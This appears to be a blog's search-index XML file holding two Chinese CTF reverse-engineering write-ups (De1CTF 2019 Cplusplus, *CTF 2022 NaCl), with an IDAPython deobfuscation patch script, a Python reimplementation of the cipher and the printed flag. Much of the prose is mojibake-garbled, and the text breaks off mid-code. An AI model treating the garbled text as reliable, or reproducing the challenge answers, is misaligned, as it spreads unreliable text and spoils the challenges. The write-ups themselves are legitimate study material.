<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>De1CTF 2019</title>
    <link href="/2024/01/14/De1CTF%202019/"/>
    <url>/2024/01/14/De1CTF%202019/</url>
    
    <content type="html"><![CDATA[<p>Cplusplus</p><span id="more"></span><h2 id="Cplusplus"><a href="#Cplusplus" class="headerlink" title="Cplusplus"></a>Cplusplus</h2><h3 id="æ€»ä½“åˆ†æ"><a href="#æ€»ä½“åˆ†æ" class="headerlink" title="æ€»ä½“åˆ†æ"></a>æ€»ä½“åˆ†æ</h3><p>ç¨‹åºçš„è¾“å…¥å’Œå…³é”®æ¯”è¾ƒå‡½æ•°éƒ½æ¯”è¾ƒæ˜æ˜¾ï¼Œç›´æ¥çœ‹å…³é”®çš„å‡½æ•°</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.21.49.png" alt="æˆªå±2024-01-14 00.21.49" style="zoom:50%;" /><p>åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢é‡Œé¢ï¼Œå‡ºç°äº†ä¸‰æ¬¡<code>sub_140005a90</code>è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ç»è¿‡ä¸€ç‚¹ğŸ¤æ—¶é—´çš„è°ƒè¯•åï¼Œå‘ç°å°±æ˜¯å­—ç¬¦ä¸²è½¬16è¿›åˆ¶ï¼Œå¹¶ä¸”é™å®šè¾“å…¥åªèƒ½æ˜¯æ•°å­—è€Œä¸èƒ½æ˜¯å­—ç¬¦ã€‚</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.22.22.png" alt="æˆªå±2024-01-14 00.22.22" style="zoom: 50%;" /><p>åŒæ—¶è¿™é‡Œç”¨äº†ä¸‰æ¬¡è¿™ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æŠŠè¾“å…¥è½¬äº†ä¸‰æ¬¡ï¼ŒçŒœæµ‹åˆ°è¿™é‡Œå°±æ˜¯æŠŠflagåˆ†æˆä¸‰æ®µï¼Œç±»ä¼¼è¿™æ ·<code>111_111_111</code>ï¼Œè¿™é‡Œä¸‹åˆ’çº¿å°±æ˜¯åˆ†éš”ç¬¦ã€‚</p><h3 id="åˆ†éš”ç¬¦"><a href="#åˆ†éš”ç¬¦" class="headerlink" title="åˆ†éš”ç¬¦"></a>åˆ†éš”ç¬¦</h3><p>ç„¶åå†æ¥ç€çœ‹è¿™ä¸ª<code>sub_140006910</code>ï¼Œç›´æ¥å¯¹ç€F5çš„ä»£ç è°ƒè¯•çš„æ—¶å€™æ€»ä¼šæœ‰å¥‡å¥‡æ€ªæ€ªçš„äº‹æƒ…ï¼Œåº”è¯¥IDAæ²¡æœ‰å¾ˆå¥½è¯†åˆ«ï¼Œæ‰€ä»¥è½¬å»çœ‹æ±‡ç¼–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œæœ‰ä¸¤ä¸ªæŒºå…³é”®çš„æ¯”è¾ƒå‡½æ•°ï¼Œä½ä¸21è¡Œå’Œ23è¡Œã€‚</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.25.55.png" alt="æˆªå±2024-01-14 00.25.55" style="zoom:50%;" /><p>å°†æ–­ç‚¹ä¸‹åœ¨è¿™é‡Œï¼ŒåŠ¨æ€è°ƒè¯•ä¼šå¾—åˆ°è¿™æ ·çš„æ±‡ç¼–</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.31.26.png" alt="æˆªå±2024-01-14 00.31.26" style="zoom:50%;" /><p>è¿™é‡Œçš„<code>al</code>å°±æ˜¯ä¹‹å‰æåŠçš„åˆ†éš”ç¬¦ï¼Œ<code>[rsi+18h]</code>å°±æ˜¯è¿™ä¸ªåˆ†éš”ç¬¦ï¼Œå¦‚æœä¸åœ¨è¿™é‡ŒåŠ åˆ†éš”ç¬¦é‚£ä¹ˆä¸Šé¢çš„<code>loc_14000599c</code>å°±ä¼šç›´æ¥é€€å‡ºã€‚æŸ¥çœ‹<code>[rsi+18]</code>å°±å¯ä»¥å¾—åˆ°è¿™ä¸ªåˆ†éš”ç¬¦ï¼Œä¸‹é¢çš„æ±‡ç¼–ä¹Ÿæ˜¯å¦‚æ­¤ã€‚æ€»ä¹‹ç°åœ¨å¾—åˆ°äº†ä¸¤ä¸ªåˆ†éš”ç¬¦åˆ†åˆ«æ˜¯@å’Œ#ï¼Œé‚£ä¹ˆè¾“å…¥çš„å½¢å¼å°±æ˜¯<code>111@111#111</code></p><h3 id="ç¬¬ä¸€éƒ¨åˆ†"><a href="#ç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†"></a>ç¬¬ä¸€éƒ¨åˆ†</h3><p>ç»è¿‡ç¬¬ä¸€ä¸ªæ ¼å¼checkåï¼Œè¿›å…¥ç¬¬äºŒä¸ªå†…å®¹checkï¼Œä¹Ÿå°±æ˜¯æ£€æŸ¥æ¯ä¸ªéƒ¨åˆ†çš„flagæ˜¯å¦æ­£ç¡®ã€‚</p><p>å…ˆçœ‹ç¬¬ä¸€éƒ¨åˆ†flagçš„æ£€æŸ¥</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.35.43.png" alt="æˆªå±2024-01-14 00.35.43" style="zoom:50%;" /><p>è¿™é‡Œçš„<code>v45</code>å°±æ˜¯ç¬¬ä¸€éƒ¨åˆ†flagçš„16è¿›åˆ¶ï¼Œå³è¾“å…¥<code>78</code>é‚£ä¹ˆ<code>v45=4E</code>ï¼Œå°±æ˜¯<code>78=0x4e</code>ã€‚è¿™ä¸ªå‡½æ•°ä¼šé¦–å…ˆé™åˆ¶è¾“å…¥å°äº<code>0x6f</code>ï¼Œç„¶åèµ°ä¸€ä¸ªååˆ†å¤æ‚çš„ç®—æ³•ï¼Œçœ‹å…¶ä»–WPè¯´è¿™æ˜¯æ¢…æ£®æ—‹è½¬ç®—æ³•ï¼Œä¸æ‡‚ã€‚ä½†å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¾ˆå…³é”®çš„æ¯”è¾ƒè¯­å¥</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.39.34.png" alt="æˆªå±2024-01-14 00.39.34" style="zoom:50%;" /><p>ä¸ç®¡ä¸­é—´ç®—æ³•æ€æ ·å¤æ‚ï¼Œè¿™é‡Œè‚¯å®šæ˜¯ä¸èƒ½<code>exit</code>çš„ï¼Œè€Œä¸”è¾“å…¥èŒƒå›´ä¹Ÿæ¯”è¾ƒå°ï¼Œé‚£ä¹ˆå°±å¯ä»¥è€ƒè™‘çˆ†ç ´ã€‚è¿™é‡Œçˆ†ç ´çš„åŸºæœ¬æ€è·¯å°±æ˜¯ä¸æ–­æ”¹å˜è¾“å…¥çš„å€¼ï¼Œç„¶åé€šè¿‡ifè¯­å¥ã€‚</p><p>çˆ†ç ´å¯ä»¥è€ƒè™‘ä»¥ä¸‹ä¸¤ç§æ‰‹æ®µï¼Œ</p><blockquote><ol><li>ç›´æ¥dumpæºç </li><li>ä»æºç¨‹åºpatch</li></ol></blockquote><p>è¿™é‡Œç”¨patchæºç¨‹åºæ–¹å¼ã€‚</p><p>å…ˆåœ¨IDAä¸­æ‰¾åˆ°å¯¹åº”ä½ç½®</p><p>è¿™é‡Œæ˜¯ä¸0x6fæ¯”è¾ƒ</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.42.49.png" alt="æˆªå±2024-01-14 00.42.49" style="zoom:50%;" /><p>x64dbgæ‰“å¼€ï¼Œæ³¨æ„è¿™é‡Œ<code>rbx</code>å¯„å­˜å™¨å­˜æ”¾çš„å°±æ˜¯ç¬¬ä¸€éƒ¨åˆ†flagå€¼çš„å†…å­˜åœ°å€</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.46.05.png" alt="æˆªå±2024-01-14 00.46.05" style="zoom:50%;" /><p>è¿™é‡Œæ˜¯ifåˆ¤æ–­è¯­å¥</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.43.29.png" alt="æˆªå±2024-01-14 00.43.29" style="zoom:50%;" /><p>x64dbgæ‰“å¼€ï¼Œ<code>rbx</code>å¯„å­˜å™¨ä»æ²¡æœ‰å‘ç”Ÿå˜åŒ–ã€‚</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.48.39.png" alt="æˆªå±2024-01-14 00.48.39" style="zoom:50%;" /><p>é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡rbxå¯„å­˜å™¨çˆ†ç ´flagï¼Œå…·ä½“patchå¦‚ä¸‹</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.51.13.png" alt="æˆªå±2024-01-14 00.51.13" style="zoom:50%;" /><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.51.39.png" alt="æˆªå±2024-01-14 00.51.39" style="zoom:50%;" /><p>å…¶ä½™éƒ¨åˆ†ä¸å˜ï¼Œç„¶ååœ¨<code>140002b07</code>ä¸‹ä¸€æ¡è¯­å¥å¤„ä¸‹æ–­ç‚¹ç„¶åè¿è¡Œï¼Œç¨‹åºæ–­ä¸‹åå†æŸ¥çœ‹<code>rbx</code>å¯„å­˜å™¨å†…å­˜å¯¹åº”å€¼å³å¯ã€‚æœ€ç»ˆä¹Ÿå°±æ˜¯çˆ†ç ´å¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†flagä¸º<code>78</code></p><h3 id="ç¬¬äºŒéƒ¨åˆ†"><a href="#ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†"></a>ç¬¬äºŒéƒ¨åˆ†</h3><p>è¿™é‡Œçš„flagå°±æ¯”è¾ƒç®€å•äº†ï¼Œå°±æ˜¯æ•°ç»„çš„ç®€å•ç´¢å¼•</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.55.38.png" alt="æˆªå±2024-01-14 00.55.38" style="zoom:50%;" /><p>å¾—åˆ°ç¬¬äºŒéƒ¨åˆ†æ˜¯<code>20637</code></p><h3 id="ç¬¬ä¸‰éƒ¨åˆ†"><a href="#ç¬¬ä¸‰éƒ¨åˆ†" class="headerlink" title="ç¬¬ä¸‰éƒ¨åˆ†"></a>ç¬¬ä¸‰éƒ¨åˆ†</h3><p>è¿™éƒ¨åˆ†åªæœ‰ä¸€æ¡è¯­å¥ï¼Œä¸è¿‡IDAè¯†åˆ«æœ‰é—®é¢˜ï¼Œç›´æ¥çœ‹æ±‡ç¼–å°±å¥½</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.56.22.png" alt="æˆªå±2024-01-14 00.56.22" style="zoom:50%;" /><p>è¿™é‡Œ<code>[rbp+0x0E0h+var_58]</code>å°±æ˜¯<code>0x22h</code>ï¼Œåªæ˜¯ä¹‹å‰é‚£ä¸ªæ¢…æ£®ç®—æ³•çš„è¾“å‡ºï¼Œ<code>[rbp+0x0E0h+var_58+4]</code>æ˜¯ç¬¬ä¸‰éƒ¨åˆ†flagã€‚</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.57.09.png" alt="æˆªå±2024-01-14 00.57.09" style="zoom:50%;" /><p>æ‰€ä»¥è¿™é‡Œå¾ˆæ˜ç¡®</p><blockquote><p>flag_3 % 0x22 &#x3D;0xc</p><p>flag_3 &#x2F; 0x22 &#x3D; 3</p></blockquote><p>é‚£ä¹ˆflag_3 &#x3D; 3 * 0x22 + 0xc &#x3D; 114</p><p>æ‰€ä»¥flagå°±æ˜¯<code>78@20637#114</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>recurrence</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>*CTF 2022</title>
    <link href="/2024/01/01/Nacl/"/>
    <url>/2024/01/01/Nacl/</url>
    
    <content type="html"><![CDATA[<p>NaClJump</p><span id="more"></span><h2 id="NaCl"><a href="#NaCl" class="headerlink" title="NaCl"></a>NaCl</h2><p>åˆ©ç”¨å­—ç¬¦ä¸²å¯ä»¥å¿«é€Ÿçš„å®šä½åˆ°å…³é”®å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.02.55.png"></p><p>å¯ä»¥å‘ç°å…³é”®æ˜¯å‡½æ•°&#96;sub_8080900ï¼Œè·Ÿè¿›è¯¥å‡½æ•°</p><p>åœ¨è¿™å‡½æ•°é‡Œé¢ï¼Œå‘ç°äº†å¤§é‡çš„<code>jmp</code>å—</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.05.33.png"></p><p>ä¹Ÿå°±æ˜¯å½¢å¦‚<code>lea lea mov jmp</code>çš„ç»„åˆ</p><p>åŒæ ·è¿˜æœ‰å¤§é‡çš„<code>jmp rdi</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.06.54.png" alt="æˆªå±2024-01-01 02.06.54"></p><p>ç»è¿‡è°ƒè¯•å¯ä»¥å‘ç°ï¼Œè¿™é‡Œçš„<code>lea lea mov jmp</code>å……å½“äº†callæŒ‡ä»¤ï¼Œ<code>lea mov and lea jmp</code>å……å½“äº†<code>retn</code>æŒ‡ä»¤ï¼Œå®é™…ä¸Šå°±æ˜¯æŠŠ<code>r15</code>å½“ä½œ<code>rsp</code>æ¥ä½¿ç”¨ã€‚è¿™æ ·å°±ä½¿å¾—å‡½æ•°å—å‰²è£‚ï¼Œå¯¼è‡´IDAè¯†åˆ«ä¸å‡†</p><blockquote><p>åœ¨ç”± Microsoft Visual C++ ç¼–è¯‘å™¨ç”Ÿæˆçš„ä»£ç ä¸­ï¼Œç»å¸¸å¯ä»¥æ‰¾åˆ°å‡½æ•°å—<br>.<br>ç¼–è¯‘å™¨ç§»åŠ¨ä¸å¸¸æ‰§è¡Œçš„ä»£ç æ®µï¼Œç”¨ä»¥å°†ç»å¸¸æ‰§è¡Œçš„ä»£ç æ®µâ€œæŒ¤å…¥â€ä¸å¤§å¯èƒ½è¢«æ¢å‡ºçš„å†…å­˜é¡µï¼Œç”±æ­¤ä¾¿äº§ç”Ÿäº†å‡½æ•°å—<br>.<br>å¦‚æœä¸€ä¸ªå‡½æ•°ä»¥è¿™ç§æ–¹å¼è¢«åˆ†å‰²ï¼ŒIDA ä¼šé€šè¿‡è·Ÿè¸ªæŒ‡å‘æ¯ä¸ªå—çš„è·³è½¬ï¼Œå°è¯•å®šä½æ‰€æœ‰ç›¸å…³çš„å—<br>.<br>å¤šæ•°æƒ…å†µä¸‹ï¼ŒIDA éƒ½èƒ½æ‰¾åˆ°æ‰€æœ‰è¿™äº›å—ï¼Œå¹¶åœ¨å‡½æ•°çš„å¤´éƒ¨åˆ—å‡ºæ¯ä¸€ä¸ªå—</p><p>.<br>æœ‰æ—¶å€™ï¼ŒIDA å¯èƒ½æ— æ³•ç¡®å®šä¸å‡½æ•°å…³è”çš„æ¯ä¸€ä¸ªå—ï¼Œæˆ–è€…å‡½æ•°å¯èƒ½è¢«é”™è¯¯åœ°è¯†åˆ«æˆå‡½æ•°å—ï¼Œè€Œéå‡½æ•°æœ¬èº«<br>.<br>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦åˆ›å»ºè‡ªå·±çš„å‡½æ•°å—ï¼Œæˆ–åˆ é™¤ç°æœ‰çš„å‡½æ•°å—<br>.<br>åœ¨åæ±‡ç¼–ä»£ç æ¸…å•ä¸­ï¼Œå‡½æ•°å—å°±å«åšå‡½æ•°å—ï¼›åœ¨ IDA çš„èœå•ç³»ç»Ÿä¸­ï¼Œå‡½æ•°å—å«åšå‡½æ•°å°¾ï¼ˆfunction tailï¼‰<br>.<br>è¦åˆ é™¤ç°æœ‰çš„å‡½æ•°å—ï¼Œå°†å…‰æ ‡æ”¾åœ¨è¦åˆ é™¤çš„å—ä¸­çš„ä»»ä½•ä¸€è¡Œä¸Šï¼Œç„¶åé€‰æ‹© Edit -&gt; Functions -&gt; Remove Function Tail<br>.<br>åœ¨åˆæ¬¡å°†æ–‡ä»¶åŠ è½½åˆ° IDA æ—¶ï¼Œå–æ¶ˆé€‰æ‹© Create function tails åŠ è½½å™¨é€‰é¡¹ï¼ŒIDA å°†ä¸åˆ›å»ºå‡½æ•°å—<br>.<br>å¦‚æœç¦ç”¨äº†å‡½æ•°å°¾ï¼Œå·²ç»åŒ…å«å‡½æ•°å°¾çš„å‡½æ•°å°†åŒ…å«æŒ‡å‘å‡½æ•°è¾¹ç•Œä»¥å¤–åŒºåŸŸçš„è·³è½¬ï¼ŒIDA ä¼šåœ¨åæ±‡ç¼–ä»£ç æ¸…å•å·¦ä¾§çš„ç®­å¤´çª—å£ä¸­ç”¨çº¢çº¿å’Œç®­å¤´çªå‡ºæ˜¾ç¤ºè¿™äº›è·³è½¬</p></blockquote><p>åŸºäºæ­¤ï¼Œå¯ä»¥ç­‰ä»·çš„patchè¿™ä¸¤ç»„æŒ‡ä»¤ï¼Œä½¿ç”¨IDApythonä¼šç›¸å½“æ–¹ä¾¿ã€‚è¿™é‡Œè¿˜è¦æ³¨æ„éœ€è¦å°†Alignå—ä¹Ÿè¦nopå¡«å……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python">start = <span class="hljs-number">0x807FEC0</span><br>end = <span class="hljs-number">0x8080AD1</span><br><br>call = [<span class="hljs-string">&#x27;lea&#x27;</span>,<span class="hljs-string">&#x27;lea&#x27;</span>,<span class="hljs-string">&#x27;mov&#x27;</span>,<span class="hljs-string">&#x27;jmp&#x27;</span>]<br>ret = [<span class="hljs-string">&#x27;lea&#x27;</span>,<span class="hljs-string">&#x27;mov&#x27;</span>,<span class="hljs-string">&#x27;and&#x27;</span>,<span class="hljs-string">&#x27;lea&#x27;</span>,<span class="hljs-string">&#x27;jmp&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nop</span>(<span class="hljs-params">s,e</span>):<br>    <span class="hljs-keyword">while</span> s &lt; e:<br>        patch_byte(s,<span class="hljs-number">0x90</span>)<br>        s += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_call</span>():<br>    des = idc.get_operand_value(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>)<br>    nop(tmp[<span class="hljs-number">3</span>]+<span class="hljs-number">5</span>,des)<br>    nop(tmp[<span class="hljs-number">0</span>],tmp[<span class="hljs-number">3</span>])<br>    patch_byte(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">0xe8</span>)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_ret</span>():<br>    nop(tmp[<span class="hljs-number">0</span>],tmp[<span class="hljs-number">4</span>])    <br>    patch_byte(tmp[<span class="hljs-number">4</span>],<span class="hljs-number">0x90</span>)<br>    patch_byte(tmp[<span class="hljs-number">4</span>]+<span class="hljs-number">1</span>,<span class="hljs-number">0xc3</span>)<br>    <br>tmp = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br><br><span class="hljs-keyword">while</span> start &lt; end:<br>    tmp[<span class="hljs-number">0</span>]=start<br>    tmp[<span class="hljs-number">1</span>]=next_head(tmp[<span class="hljs-number">0</span>])<br>    tmp[<span class="hljs-number">2</span>]=next_head(tmp[<span class="hljs-number">1</span>])<br>    tmp[<span class="hljs-number">3</span>]=next_head(tmp[<span class="hljs-number">2</span>])<br>    tmp[<span class="hljs-number">4</span>]=next_head(tmp[<span class="hljs-number">3</span>])   <br>   <span class="hljs-comment"># print(hex(start))</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> idc.print_insn_mnem(tmp[i]) != call[i]:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        patch_call()<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> idc.print_insn_mnem(tmp[i]) != ret[i]:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        patch_ret()<br>        <br>    start = idc.next_head(start)<br></code></pre></td></tr></table></figure><p>patchå®Œåçš„æ±‡ç¼–å¤§æ¦‚é•¿è¿™æ ·å­</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.14.55.png"></p><p>è¿˜éœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼ŒIDAå¯èƒ½ä¼šé”™è¯¯è¯†åˆ«å‡½æ•°çš„è¾¹ç•Œï¼Œéœ€è¦è®°ä½åªæœ‰<code>retn</code>æ‰æ˜¯å‡½æ•°çš„ç»“æŸï¼Œåœ¨<code>retn</code>çš„åœ°æ–¹æŒ‰<code>e</code>æ ‡è®°ä¸ºå‡½æ•°ç»“æŸã€‚è¿˜æœ‰å…¶ä»–åº”è¯¥è¯†åˆ«ä¸ºå‡½æ•°çš„ï¼Œæ¯”å¦‚<code>call sub_xxxx</code>ï¼Œä½†æ˜¯ç›¸åº”åœ°å€å¯èƒ½åªæ˜¯<code>loc_xxxx</code>ï¼Œé‚£å°±è¦æŒ‰<code>p</code>é‡æ–°åˆ†æä¸€ä¸‹ä¸ºå‡½æ•°ï¼›å‡½æ•°ä½“å†…ä¸åº”è¯¥å­˜åœ¨çš„<code>sub_xxxx</code>ï¼Œåˆ™éœ€è¦å…ˆæŒ‰<code>u</code>è½¬ä¸ºæœªå®šä¹‰ï¼Œå†æŒ‰<code>c</code>è½¬ä¸ºä»£ç ã€‚</p><p>æœ€åçš„åæ±‡ç¼–åº”è¯¥æ˜¯è¿™æ ·å­</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.19.40.png" alt="æˆªå±2024-01-01 02.19.40"></p><p>ç®€å•åˆ†æä¸€ä¸‹ï¼Œ<code>*(input+36)</code>ä½œä¸ºä¸€ä¸ªç´¢å¼•ï¼Œå°†è¾“å…¥åˆ†ä¸º4ä¸ªéƒ¨åˆ†ï¼Œè€Œåœ¨ä¹‹å‰çš„å‡½æ•°è¾“å…¥ä¸­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥flagåº”è¯¥æ˜¯32ä½ï¼Œé‚£ä¹ˆè¿™é‡Œå°±æ˜¯8å­—èŠ‚ä¸€ç»„çš„åŠ å¯†ï¼Œç»“åˆforå¾ªç¯çš„ç¬¬ä¸€å¥ï¼Œä¹ŸéªŒè¯äº†è¿™ä¸ªçŒœæƒ³ã€‚</p><p>è·Ÿå…¥<code>sub_8080720</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.22.10.png" alt="æˆªå±2024-01-01 02.22.10"></p><p>è¿™é‡Œé¢<code>sub_8080360</code>æ˜¯åœ¨åšæ•°æ®å‡†å¤‡ï¼Œä¸è¾“å…¥æ— å…³ã€‚</p><p>ç»è¿‡è°ƒè¯•å¯ä»¥å°†è¿™æ®µåŠ å¯†ç­‰ä»·è½¬ä¸ºå¦‚ä¸‹pythonä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ROL</span>(<span class="hljs-params">value,count</span>):<br>     <span class="hljs-keyword">return</span> ((value &lt;&lt; count) &amp; <span class="hljs-number">0xffffffff</span>) | (value &gt;&gt; (<span class="hljs-number">0x20</span> - count))<br><br><br>table = [<span class="hljs-number">67438087</span>, <span class="hljs-number">66051</span>, <span class="hljs-number">202182159</span>, <span class="hljs-number">134810123</span>, <span class="hljs-number">3443517467</span>, <span class="hljs-number">3619968119</span>, <span class="hljs-number">2671678006</span>, <span class="hljs-number">17297799</span>, <span class="hljs-number">4187212673</span>, <span class="hljs-number">3212056172</span>, <span class="hljs-number">3659105319</span>, <span class="hljs-number">436579327</span>, <span class="hljs-number">2466768356</span>, <span class="hljs-number">3414888005</span>, <span class="hljs-number">812513269</span>, <span class="hljs-number">2905604503</span>, <span class="hljs-number">2860953686</span>, <span class="hljs-number">1150444474</span>, <span class="hljs-number">1067728923</span>, <span class="hljs-number">507640087</span>, <span class="hljs-number">3335200381</span>, <span class="hljs-number">418057594</span>, <span class="hljs-number">3572254720</span>, <span class="hljs-number">3028744491</span>, <span class="hljs-number">2268592627</span>, <span class="hljs-number">1985887525</span>, <span class="hljs-number">3678221623</span>, <span class="hljs-number">3997455659</span>, <span class="hljs-number">298895692</span>, <span class="hljs-number">2606783435</span>, <span class="hljs-number">2419824819</span>, <span class="hljs-number">616754851</span>, <span class="hljs-number">2305691810</span>, <span class="hljs-number">575140032</span>, <span class="hljs-number">3092143274</span>, <span class="hljs-number">2368472304</span>, <span class="hljs-number">1002931244</span>, <span class="hljs-number">441505286</span>, <span class="hljs-number">1235325308</span>, <span class="hljs-number">2115810572</span>, <span class="hljs-number">4230461478</span>, <span class="hljs-number">1608376252</span>, <span class="hljs-number">3725575172</span>, <span class="hljs-number">2998077703</span>]<br><br>v1 = <span class="hljs-number">0x61616161</span><br>v2 = <span class="hljs-number">0x62626262</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>    v = v1<br>    v6 = ROL(v1,<span class="hljs-number">1</span>)<br>    v7 = ROL(v1,<span class="hljs-number">8</span>) &amp; v6<br><br>    v1 = v7 ^ ROL(v1,<span class="hljs-number">2</span>) ^ v2 ^ table[i]<br>    v2 = v<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>v1,v2</code>ä»£è¡¨äº†8å­—èŠ‚flagçš„ä½4å­—èŠ‚å’Œé«˜4å­—èŠ‚ï¼Œ<code>table</code>åˆ™æ˜¯ç”±å‡½æ•°<code>sub_8080360</code>å¾—åˆ°</p><p>ç»è¿‡<code>sub_8080720</code>åï¼Œåˆ™æ˜¯è¿›å…¥<code>sub_8080100</code>ï¼Œè¿™æ˜¯ä¸ªå¾ˆæ˜æ˜¾çš„TEAç®—æ³•</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.25.41.png"></p><p>å”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯å¾ªç¯è½®æ¬¡ä¸ä¹‹å‰çš„ç´¢å¼•æœ‰å…³</p><p>ç°åœ¨å¯ä»¥å¾—åˆ°å®Œæ•´çš„åŠ å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 